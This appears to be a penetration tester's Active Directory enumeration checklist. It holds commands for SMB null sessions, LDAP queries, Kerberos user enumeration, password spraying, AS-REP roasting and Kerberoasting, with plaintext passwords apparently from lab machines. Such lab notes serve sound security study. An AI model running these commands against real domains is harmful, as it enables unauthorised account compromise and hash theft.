## AD Checklist

Run through all of the relevant ports' mds.

```bash
sudo ntpdate $ip

enum4linux -a $ip
enum4linux -a -u "CRAFT2\\thecybergeek" -p "winniethepooh" $ip
enum4linux -a -M -l -d $ip 2>&1
enum4linux-ng $ip

smbclient -L //$ip
smbclient -N -L //$ip
smbclient -L //$ip -N

nxc smb $ip -u 'a' -p '' --shares
nxc smb $ip -u 'administrator' -p '' --shares
nxc smb $ip -u 'administrator' -p 'fake' --shares
nxc smb $ip -u '' -p 'fake' --shares
nxc smb $ip -u users.txt -p users.txt --no-bruteforce --continue-on-success

rpcclient -U "" $ip 
rpcclient $ip -N -U ""

ldapsearch -x -H ldap://$ip
ldapsearch -x -H ldap://$ip -s base namingcontexts
ldapsearch -x -H ldap://$ip -b "DC=exampleH,DC=example"
ldapsearch -x -H ldap://$ip -b "DC=exampleH,DC=example" '(objectClass=Person)'
ldapsearch -x -H ldap://$ip -b "DC=exampleH,DC=example" '(objectClass=Person)' sAMAccountName sAMAccountType
ldapsearch -x -H ldap://$ip  "DC=DomainDnsZones,DC=support,DC=htb"
ldapsearch -H ldap://$ip -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'dc=support,dc=htb'

# If you attempt to authenticate to an AD server via Kerberos, it's going to say 'hey, continue with pre-authentication'. It doesn't do that with invalid names.
/opt/kerbrute userenum usernames.txt -d "EGOTISTICAL-BANK.LOCAL" --dc $ip

psexec.py

impacket-GetADUsers -dc-ip $ip "exampleH.example/" -all
impacket-GetADUsers -dc-ip 192.168.214.122 exampleH.example/fmcsorley:CrabSharkJellyfish192 -all

# Even if you don't have a password, use their username to auth
GetNPUsers.py -request -format hashcat -outputfile asrep.txt "DOMAIN/fsmith"
GetNPUsers.py -request -format hashcat -outputfile asrep.txt -dc-ip $ip 'DOMAIN/'
GetNPUsers.py -request -format hashcat -outputfile asrep.txt -dc-ip $ip example.com/user:password

impacket-GetUserSPNs -request -format hashcat -outputfile hashes.kerberoast  "DOMAIN/fsmith"
impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip 'DOMAIN/'
impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip example.com/user:password

/opt/windows/nxc.sh $ip
```